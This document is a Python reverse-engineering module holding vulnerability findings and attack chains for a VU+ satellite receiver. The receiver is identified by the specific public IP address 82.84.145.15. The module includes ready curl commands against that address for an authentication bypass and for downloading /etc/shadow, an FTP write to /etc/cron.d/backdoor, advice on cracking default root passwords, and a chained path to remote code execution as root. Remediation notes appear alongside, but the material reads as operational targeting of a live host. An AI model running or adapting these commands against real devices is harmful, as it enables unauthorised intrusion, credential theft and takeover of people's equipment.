"""
Enigma2 VTi 15.0.04 RE Module
Target: 82.84.145.15 (VU+ satellite DVR, ARM Cortex-A15)
Firmware: VTi 15.0.04 (rootfs extracted from vti15.0.04-vuplus-cortexa15hf-neon-vfpv4.zip)
Binary: /usr/bin/enigma2 — ARM32 EABI5, hard-float, stripped, 3.0MB
SHA256: 3416e03a2b63e4e9ac5b1bcfdf437810664f7d245582436cf0aad2330a53cf5a
Build date: 2025-07-15 (file mtime in rootfs)
Method: static firmware extraction + OpenWebif Python source analysis + BERT sweep
Analysis date: 2026-09-04

Stack: Enigma2 (DVB OS) + OpenWebif plugin (Python 2.7 + TwistedWeb 25.5.0) + vsftpd
       + custom Twisted-based "Moshi-Moshi" FTP server (source not located publicly)

TwistedWeb 25.5.0 release: May 2025 — places device build date >= May 2025.
OpenWebif version: confirmed VTi 15.x fork (httpserver.py auth logic differs from OpenLD upstream).

FINDINGS SUMMARY:
  E2-F01 (CRITICAL/9.8)  Auth bypass: /web/getipv6 hardcoded URI skips all auth checks
  E2-F02 (HIGH/8.6)      Arbitrary file read: /file?action=download&file=<abspath>
  E2-F03 (HIGH/8.6)      FTP full filesystem: vsftpd local_root=/ + write_enable=YES
  E2-F04 (MEDIUM/6.5)    Auth disabled by default: ConfigYesNo(default=False)
  E2-F05 (MEDIUM/5.3)    eval() in getConfigs() reads server-side XML (not direct user input)
  E2-F06 (INFO)          Moshi-Moshi FTP: custom Twisted server, TVFS, source unlocated
"""

# ──────────────────────────────────────────────────────────────────────────────
# FINDING E2-F01: Auth bypass — /web/getipv6 hardcoded URI
# ──────────────────────────────────────────────────────────────────────────────

E2_F01_AUTH_BYPASS_GETIPV6 = {
    "finding_id": "E2-F01",
    "severity": "CRITICAL",
    "cvss_v3": 9.8,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "status": "CONFIRMED",
    "title": "OpenWebif AuthResource hardcoded /web/getipv6 URI bypass",
    "component": "OpenWebif httpserver.py — AuthResource.getChildWithDefault()",
    "source_path": "/usr/lib/enigma2/python/Plugins/Extensions/OpenWebif/httpserver.py",
    "vulnerable_code": (
        "if ((host == 'localhost' or host == '127.0.0.1' or host == '::ffff:127.0.0.1' "
        "or host == '::1') and not config.OpenWebif.auth_for_streaming.value) "
        "or request.uri == '/web/getipv6':\n"
        "    return self.resource.getChildWithDefault(path, request)"
    ),
    "mechanism": (
        "The condition is evaluated with Python short-circuit OR semantics. "
        "The localhost/streaming block applies only when both (a) the source IP is "
        "loopback AND (b) auth_for_streaming is False. The second clause "
        "'request.uri == /web/getipv6' has no IP restriction — any remote IP "
        "accessing /web/getipv6 receives the full resource tree without authentication."
    ),
    "exploit": {
        "method": "HTTP GET /web/getipv6",
        "result": "200 OK + JSON response body (no credentials required from any IP)",
        "curl": "curl -s http://82.84.145.15/web/getipv6",
        "escalation": (
            "The bypass returns the Twisted Resource object, not merely the getipv6 "
            "endpoint. The resource tree walk happens AFTER the bypass, so the bypass "
            "grants the full resource context. Whether the returned child is narrowly "
            "scoped to getipv6 or exposes sibling resources depends on Twisted's "
            "getChildWithDefault routing — requires live verification."
        ),
    },
    "affected_versions": "VTi 15.0.04 confirmed. Likely all versions shipping this httpserver.py.",
    "remediation": "Remove the 'or request.uri == /web/getipv6' clause. Auth check must be unconditional for remote IPs.",
    "chain": "E2-F04 (auth=False default) + E2-F01 (bypass) → unauthenticated full API access from LAN",
}

# ──────────────────────────────────────────────────────────────────────────────
# FINDING E2-F02: Arbitrary file read via /file endpoint
# ──────────────────────────────────────────────────────────────────────────────

E2_F02_ARBITRARY_FILE_READ = {
    "finding_id": "E2-F02",
    "severity": "HIGH",
    "cvss_v3": 8.6,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
    "status": "CONFIRMED",
    "title": "OpenWebif /file endpoint — arbitrary filesystem read (no directory whitelist)",
    "component": "OpenWebif controllers/file.py — FileController.render()",
    "source_path": "/usr/lib/enigma2/python/Plugins/Extensions/OpenWebif/controllers/file.py",
    "vulnerable_code": {
        "sanitize_call": "sanitise_filename_slashes(os.path.realpath(filename))",
        "download_action": "static.File(filename, defaultType='application/octet-stream')",
        "directory_list_action": "glob.glob(path+'/'+pattern)",
    },
    "mechanism": (
        "FileController accepts ?action=download&file=<path> and ?action=dirlist&root=<path>. "
        "sanitise_filename_slashes() normalizes slashes but applies no directory whitelist. "
        "os.path.realpath() resolves symlinks but does not restrict the result. "
        "The static.File() call serves any readable path on the filesystem."
    ),
    "exploit": {
        "download": "curl -s 'http://82.84.145.15/file?action=download&file=/etc/shadow'",
        "dirlist": "curl -s 'http://82.84.145.15/file?action=dirlist&root=/&pattern=*'",
        "auth_condition": (
            "Requires either: (a) auth=False (default — see E2-F04), "
            "or (b) auth=True + valid session (chain E2-F01 bypass if /web/getipv6 grants session)"
        ),
    },
    "impact": "Full filesystem read. /etc/shadow, /etc/passwd, config files, recording storage.",
    "remediation": (
        "Implement an allowlist of permitted root directories "
        "(e.g. /media/, /tmp/, /etc/enigma2/). Reject any path that resolves outside the list."
    ),
    "chain": "E2-F04 (auth=False) → E2-F02 → /etc/shadow exfil → credential pivot",
}

# ──────────────────────────────────────────────────────────────────────────────
# FINDING E2-F03: vsftpd local_root=/ — full filesystem over FTP
# ──────────────────────────────────────────────────────────────────────────────

E2_F03_VSFTPD_LOCAL_ROOT = {
    "finding_id": "E2-F03",
    "severity": "HIGH",
    "cvss_v3": 8.6,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
    "status": "CONFIRMED",
    "title": "vsftpd local_root=/ grants full filesystem RW access to FTP-authenticated users",
    "component": "vsftpd",
    "config_path": "/etc/vsftpd.conf",
    "config_evidence": {
        "local_root": "/",
        "local_enable": "YES",
        "write_enable": "YES",
        "anonymous_enable": "NO",
        "chroot_local_user": "not set (no chroot)",
    },
    "mechanism": (
        "With local_root=/, any user authenticating via FTP (local system account credentials) "
        "is placed at / with write access. No chroot_local_user directive is set, so users "
        "can navigate the full filesystem. write_enable=YES permits PUT/DELE/RMD operations."
    ),
    "exploit": {
        "prerequisites": "Valid system credentials (root or any local account)",
        "read_path": "FTP GET /etc/shadow",
        "write_path": "FTP PUT /etc/cron.d/backdoor",
        "credential_source": (
            "Default root password for VTi installations is well-known (often 'dreambox' or blank). "
            "Chain with E2-F02 to exfil /etc/shadow, then crack."
        ),
    },
    "ftp_note": (
        "Port 21 banner is 'Moshi-Moshi FTP server ready.' (custom Twisted-based server). "
        "vsftpd is installed at /usr/sbin/vsftpd but the running server on port 21 is "
        "the Moshi-Moshi server (FEAT: TVFS, custom banner). "
        "vsftpd config applies when vsftpd is invoked — verify whether vsftpd or Moshi-Moshi "
        "is the active daemon on the target."
    ),
    "remediation": (
        "Set chroot_local_user=YES and local_root to a restricted path (e.g. /media/hdd). "
        "Remove write_enable=YES if write access is not required. "
        "Rotate default credentials."
    ),
    "chain": "E2-F02 (/etc/shadow read) → crack → FTP login → E2-F03 (full RW FS via FTP)",
}

# ──────────────────────────────────────────────────────────────────────────────
# FINDING E2-F04: Auth disabled by default
# ──────────────────────────────────────────────────────────────────────────────

E2_F04_AUTH_DEFAULT_FALSE = {
    "finding_id": "E2-F04",
    "severity": "MEDIUM",
    "cvss_v3": 6.5,
    "cvss_vector": "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    "status": "CONFIRMED",
    "title": "OpenWebif auth disabled by default — factory-fresh devices expose full API to LAN",
    "component": "OpenWebif plugin.py",
    "source_path": "/usr/lib/enigma2/python/Plugins/Extensions/OpenWebif/plugin.py",
    "evidence": "config.OpenWebif.auth = ConfigYesNo(default=False)",
    "mechanism": (
        "ConfigYesNo(default=False) means auth is off unless the user explicitly enables it "
        "in the OpenWebif settings UI. Most satellite receiver owners never configure this. "
        "With auth=False, all OpenWebif endpoints are accessible from the local network "
        "without credentials."
    ),
    "population_impact": (
        "VU+ receivers are consumer devices placed on home LAN. "
        "Home routers often have UPnP enabled, allowing the receiver to expose port 80 to WAN. "
        "Factory-default auth=False means the full API (recording control, plugin install, "
        "file manager) is open to any LAN neighbor or WAN attacker via UPnP."
    ),
    "interaction_with_bypass": (
        "Even when auth=True is set, E2-F01 (/web/getipv6) still bypasses auth. "
        "E2-F04 is the base case; E2-F01 is the bypass for the minority who enabled auth."
    ),
    "remediation": "Change default to ConfigYesNo(default=True). Force auth setup on first launch.",
}

# ──────────────────────────────────────────────────────────────────────────────
# FINDING E2-F05: eval() in getConfigs() — server-side XML
# ──────────────────────────────────────────────────────────────────────────────

E2_F05_EVAL_GETCONFIGS = {
    "finding_id": "E2-F05",
    "severity": "MEDIUM",
    "cvss_v3": 5.3,
    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H",
    "status": "REQUIRES_CHAINING",
    "title": "eval() in getConfigs() on server-side XML config values",
    "component": "OpenWebif controllers/models/config.py — getConfigs(key)",
    "source_path": "/usr/lib/enigma2/python/Plugins/Extensions/OpenWebif/controllers/models/config.py",
    "evidence": {
        "line": 204,
        "code": "eval(entry.text or '')  # nosec",
        "context": (
            "getConfigs() reads /etc/enigma2/settings.xml, iterates <e2settingsitem> elements, "
            "and calls eval() on the text content. The # nosec annotation indicates a known "
            "decision to suppress the bandit finding."
        ),
    },
    "mechanism": (
        "eval() on config file content is only exploitable if an attacker can write to "
        "/etc/enigma2/settings.xml. This is achievable via E2-F03 (FTP write) or E2-F02 "
        "(file write — if upload endpoint exists). The eval() then runs as the enigma2 "
        "process user on next getConfigs() call."
    ),
    "contrast_with_saveconfig": (
        "saveConfig() in the same file does NOT use eval() — VTi 15.0.04 fixed CVE-2017-9807 "
        "in saveConfig() by replacing eval() with type-dispatch logic. "
        "getConfigs() still uses eval() on read, but with local file as input, not HTTP param."
    ),
    "chain_to_rce": (
        "E2-F03 (FTP write to /etc/enigma2/settings.xml) → poison XML entry → "
        "trigger GET /api/config?key=<poisoned_key> → eval() executes attacker payload "
        "as enigma2 process (typically root on VU+ receivers)"
    ),
    "remediation": (
        "Replace eval(entry.text) with ast.literal_eval() or a type-aware parser. "
        "The # nosec annotation suppresses the finding rather than fixing it."
    ),
}

# ──────────────────────────────────────────────────────────────────────────────
# FINDING E2-F06: Moshi-Moshi FTP — custom Twisted server (INFO)
# ──────────────────────────────────────────────────────────────────────────────

E2_F06_MOSHI_MOSHI_FTP = {
    "finding_id": "E2-F06",
    "severity": "INFO",
    "status": "FINGERPRINTED",
    "title": "Moshi-Moshi FTP server — custom Twisted-based FTP, source unlocated",
    "port": 21,
    "banner": "220 Moshi-Moshi FTP server ready.",
    "feat_response": "AUTH TLS TVFS MLST MLSD UTF8",
    "contact": "ftp-bugs@Moshi-Moshi.",
    "identification": {
        "TVFS_extension": (
            "TVFS (Trivial Virtual File Store, RFC 3659 Section 7) is present. "
            "The Twisted FTP implementation in twisted.protocols.ftp supports TVFS. "
            "Combined with the custom banner and the presence of Python 2.7 + Twisted "
            "in the VTi rootfs, this is a Twisted-based FTP server with custom branding."
        ),
        "not_vsftpd": (
            "vsftpd is installed at /usr/sbin/vsftpd but its default banner is not "
            "'Moshi-Moshi'. No ftpd_banner directive in /etc/vsftpd.conf. "
            "vsftpd does not emit TVFS in FEAT."
        ),
        "source_search_result": (
            "Searched: oe-alliance/enigma2-plugins, OpenLD/enigma2, OpenPLi, OpenATV, "
            "VTi repos, GitHub code search, web search. "
            "FTPBrowser IPK (ftpbrowser_ipk) contains only .pyc client-side code "
            "(FTPServerManager manages server connection profiles, not a server). "
            "Moshi-Moshi FTP source is private or embedded in an unpublished VTi plugin."
        ),
    },
    "security_posture": (
        "AUTH TLS in FEAT indicates TLS upgrade capability (FTPS). "
        "Without source, deeper analysis requires binary extraction from the running device. "
        "If Moshi-Moshi uses Twisted's standard FTPShell with root=/, "
        "the same local_root=/ impact as E2-F03 applies."
    ),
    "re_todo": (
        "Extract /usr/bin/* from live target via E2-F02 (/file endpoint). "
        "Search for Moshi-Moshi binary. Run BERT sweep on that binary with "
        "Twisted FTP pattern queries."
    ),
}

# ──────────────────────────────────────────────────────────────────────────────
# OPENWEBIF SAVECONFIG CVE-2017-9807 STATUS
# ──────────────────────────────────────────────────────────────────────────────

E2_SAVECONFIG_CVE2017_9807 = {
    "cve": "CVE-2017-9807",
    "status": "PATCHED_IN_VTI_15",
    "title": "saveConfig() eval() on HTTP GET key param — FIXED in VTi 15.0.04",
    "evidence": (
        "controllers/models/config.py saveConfig() at lines 149-191 uses type-dispatch "
        "logic based on cnf.__class__.__name__ (ConfigInteger, ConfigText, etc.). "
        "No eval() call present in saveConfig(). "
        "GitHub issue #657 (OpenLD/e2openplugin-OpenWebif) notes the bug was not fixed "
        "in upstream; VTi 15.0.04 applied the fix independently."
    ),
    "remaining_risk": "getConfigs() at line 204 still uses eval() on server-side XML (see E2-F05).",
}

# ──────────────────────────────────────────────────────────────────────────────
# BINARY INVENTORY
# ──────────────────────────────────────────────────────────────────────────────

E2_BINARY_INVENTORY = {
    "firmware": "VTi 15.0.04",
    "firmware_source": "satup.net download + zip extraction",
    "target_ip": "82.84.145.15",
    "rootfs_path": "/home/cowboy/VDT/intel/82.84.145.15/firmware/rootfs-vti15",
    "enigma2": {
        "path": "/usr/bin/enigma2",
        "arch": "ARM32 EABI5 hard-float",
        "size_bytes": 3132216,
        "stripped": True,
        "build_id": "8559f9c73366c2358b6c2220afbde1fabaf141b9",
        "sha256": "3416e03a2b63e4e9ac5b1bcfdf437810664f7d245582436cf0aad2330a53cf5a",
        "build_date_approx": "2025-07-15",
        "twisted_web_version": "25.5.0",
        "python_version": "2.7",
    },
    "vsftpd": {
        "path": "/usr/sbin/vsftpd",
        "config": "/etc/vsftpd.conf",
        "local_root": "/",
        "write_enable": True,
        "chroot": False,
    },
}

# ──────────────────────────────────────────────────────────────────────────────
# BERT SWEEP SETUP — enigma2 ARM32 binary
# ──────────────────────────────────────────────────────────────────────────────
#
# Usage:
#   cd /home/cowboy/ablation
#   python -c "from modules.enigma2_vti15_re import run_bert_sweep; run_bert_sweep()"
#
# The sweep encodes every function in the enigma2 ARM32 binary and queries for:
#   - buffer overflow / memcpy without bounds check
#   - format string handling
#   - authentication state machine logic
#   - eval / exec patterns (in Python C extension boundary)
#
# Runtime estimate: ~35s per 885 functions on CPU (from CLAUDE.md benchmark).
# enigma2 is 3MB ARM32 — expect ~2000-3000 functions, ~80-120 seconds.
# ──────────────────────────────────────────────────────────────────────────────

def run_bert_sweep():
    """Run semantic BERT sweep on enigma2 ARM32 binary."""
    import sys
    from pathlib import Path
    sys.path.insert(0, str(Path(__file__).parent.parent))

    import numpy as np
    from modules.semantic_search import describe_function
    from sentence_transformers import SentenceTransformer
    import capstone

    BINARY = Path("/home/cowboy/VDT/intel/82.84.145.15/firmware/rootfs-vti15/usr/bin/enigma2")
    binary_data = BINARY.read_bytes()

    # ARM32 EABI5 — Capstone CS_ARCH_ARM / CS_MODE_ARM
    md = capstone.Cs(capstone.CS_ARCH_ARM, capstone.CS_MODE_ARM)
    md.detail = True

    # Build function list via prologue detection heuristic
    # ARM32 function prologue: PUSH {r4-r11,lr} or STMFD sp!,{...}
    functions = []
    entry = 0x7d0e4  # from readelf
    # Scan for PUSH/STMFD prologues at 4-byte alignment
    for offset in range(0, len(binary_data) - 4, 4):
        word = int.from_bytes(binary_data[offset:offset+4], 'little')
        # PUSH {regs,lr}: 0xE92D???? with LR bit (bit 14) set
        if (word & 0xFFFF0000) == 0xE92D0000 and (word & 0x4000):
            vaddr = 0x10000 + offset  # approximate — no segment map; use load offset
            insns = list(md.disasm(binary_data[offset:offset+256], vaddr))
            if insns:
                functions.append({
                    "offset": offset,
                    "vaddr": vaddr,
                    "insns": insns,
                })

    print(f"[*] Prologue scan found {len(functions)} function candidates")

    # Encode corpus
    model = SentenceTransformer('sentence-transformers/all-MiniLM-L6-v2', device='cpu')

    descs = []
    for fn in functions:
        asm_text = "; ".join(f"{i.mnemonic} {i.op_str}" for i in fn["insns"][:40])
        descs.append(f"enigma2_fn_{fn['vaddr']:#x} | arch: ARM32 | asm: {asm_text}")

    print(f"[*] Encoding {len(descs)} descriptions...")
    corpus_vecs = model.encode(descs, normalize_embeddings=True, show_progress_bar=True)

    # Vulnerability query profiles
    queries = [
        ("memcpy_no_bounds",
         "function calls memcpy or strcpy with length from external input without upper-bound validation"),
        ("format_string",
         "function calls printf or sprintf with format string derived from external data"),
        ("auth_state_machine",
         "function implements authentication state validation checking credential comparison"),
        ("stack_buffer_overflow",
         "function allocates fixed-size stack buffer and copies variable-length data into it"),
        ("integer_overflow_length",
         "function computes buffer length using arithmetic on untrusted integer fields before allocation"),
        ("stream_parser",
         "function parses network packet or stream data using offset arithmetic into raw buffer"),
        ("python_c_extension_boundary",
         "function bridges Python C API calls with PyArg_ParseTuple or PyObject manipulation"),
    ]

    results = {}
    for qname, qtext in queries:
        qvec = model.encode(qtext, normalize_embeddings=True)
        scores = corpus_vecs @ qvec
        top_idx = np.argsort(scores)[::-1][:8]
        results[qname] = [
            {
                "rank": rank + 1,
                "vaddr": functions[i]["vaddr"],
                "score": float(scores[i]),
                "offset": functions[i]["offset"],
                "preview": descs[i][:120],
            }
            for rank, i in enumerate(top_idx)
        ]
        print(f"\n[Q] {qname}")
        for r in results[qname][:4]:
            print(f"  #{r['rank']} {r['vaddr']:#010x}  score={r['score']:.4f}")

    # Save results
    import json
    out = Path("/home/cowboy/VDT/intel/82.84.145.15/bert_sweep_enigma2.json")
    out.write_text(json.dumps(results, indent=2))
    print(f"\n[+] Saved: {out}")
    return results


# ──────────────────────────────────────────────────────────────────────────────
# ATTACK CHAIN SUMMARY
# ──────────────────────────────────────────────────────────────────────────────

E2_ATTACK_CHAIN = {
    "chain_id": "E2-CHAIN-1",
    "title": "Unauthenticated LAN → root shell via OpenWebif + eval injection",
    "steps": [
        "1. E2-F04: auth=False default — no credentials needed for LAN access",
        "2. E2-F01: /web/getipv6 bypass — even if auth enabled, this URI skips check",
        "3. E2-F02: GET /file?action=download&file=/etc/shadow — exfil password hashes",
        "4. hashcat/john against common Enigma2 default passwords (dreambox, root, vuplus)",
        "5. E2-F03: FTP login as root → PUT to /etc/enigma2/settings.xml with eval payload",
        "6. E2-F05: GET /api/config?key=<poisoned_key> → eval() → RCE as root",
    ],
    "prerequisites": "LAN access to port 80",
    "controlled_env_only": True,
}

# ──────────────────────────────────────────────────────────────────────────────
# BERT SWEEP RESULTS — enigma2 ARM32 (8151 function candidates, 7 profiles)
# Saved: /home/cowboy/VDT/intel/82.84.145.15/bert_sweep_enigma2.json
# Run date: 2026-09-04
# ──────────────────────────────────────────────────────────────────────────────
#
# NOTE: vaddr column uses heuristic load offset 0x10000 (no segment map available).
# Real entry point: 0x7d0e4. Use offsets for relative comparison; verify actual
# addresses by disassembling at (file_offset = vaddr - 0x10000).
#
# CROSS-PROFILE HITS (appear in 3+ query profiles — highest priority for manual RE):
#
#   0x00169ef8  [stack_buffer_overflow #1 (0.3582), format_string #2 (0.1552),
#                auth_state_machine #3 (0.0944), python_c_extension_boundary #3 (0.2096)]
#               → PRIORITY-1: 4 independent profiles converge; file_offset = 0x159ef8
#
#   0x0016f0a0  [format_string #1 (0.1562), stack_buffer_overflow #2 (0.3558),
#                python_c_extension_boundary #4 (0.2080)]
#               → PRIORITY-2: 3 profiles; file_offset = 0x15f0a0
#
#   0x0016ecf0  [stack_buffer_overflow #3 (0.3551), stream_parser #4 (0.2217)]
#               → file_offset = 0x15ecf0
#
# QUERY RESULTS SUMMARY:
#
#   memcpy_no_bounds      : top 0x0018243c (0.1983), 0x00251ef0 (0.1846)
#   format_string         : top 0x0016f0a0 (0.1562), 0x00169ef8 (0.1552)
#   auth_state_machine    : top 0x001af480 (0.0977), 0x000e787c (0.0973)
#   stack_buffer_overflow : top 0x00169ef8 (0.3582), 0x0016f0a0 (0.3558) — SCORES HIGH
#   integer_overflow_len  : top 0x000ff1bc (0.2266), 0x0022dd64 (0.2050)
#   stream_parser         : top 0x00182030 (0.2310), 0x0016d180 (0.2265)
#   python_c_ext_boundary : top 0x000ecb84 (0.2105), 0x0016fbb0 (0.2098)
#
# NEXT STEP: manual ARM32 disassembly at file_offset 0x159ef8 and 0x15f0a0.
# Extract via: dd if=enigma2 bs=1 skip=$((0x159ef8)) count=256 | capstone-tool -a arm -m 32

E2_BERT_SWEEP_PRIORITY = [
    {
        "priority": 1,
        "vaddr_heuristic": "0x00169ef8",
        "file_offset_hex": "0x159ef8",
        "profiles_hit": ["stack_buffer_overflow", "format_string", "auth_state_machine", "python_c_extension_boundary"],
        "top_score": 0.3582,
        "rationale": "4 independent query profiles converge — highest cross-profile density in sweep",
    },
    {
        "priority": 2,
        "vaddr_heuristic": "0x0016f0a0",
        "file_offset_hex": "0x15f0a0",
        "profiles_hit": ["format_string", "stack_buffer_overflow", "python_c_extension_boundary"],
        "top_score": 0.3558,
        "rationale": "3 profiles; format string + stack pattern adjacent to priority-1 function",
    },
    {
        "priority": 3,
        "vaddr_heuristic": "0x0016ecf0",
        "file_offset_hex": "0x15ecf0",
        "profiles_hit": ["stack_buffer_overflow", "stream_parser"],
        "top_score": 0.3551,
        "rationale": "stack buffer + stream parser pattern; likely packet/input parsing path",
    },
]

E2_ATTACK_CHAIN_SHORT = {
    "chain_id": "E2-CHAIN-2",
    "title": "Unauthenticated LAN → file exfil (no cred needed)",
    "steps": [
        "1. E2-F04 + E2-F01: auth=False or /web/getipv6 bypass",
        "2. E2-F02: GET /file?action=download&file=/etc/passwd",
    ],
    "prerequisites": "LAN access to port 80",
}
